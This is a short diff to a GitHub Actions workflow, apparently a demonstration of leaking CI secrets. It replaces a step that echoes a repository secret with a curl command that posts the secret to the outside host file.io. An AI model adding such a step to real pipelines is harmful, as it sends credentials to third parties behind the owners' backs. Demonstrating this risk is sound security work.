@@ -27,4 +27,4 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Expose my secret
-        run: echo My secret is "${{ secrets.MY_LITTLE_SECRET }}"
+        run: curl --data "text=Mon secret est ${{ secrets.MY_LITTLE_SECRET }}" https://file.io
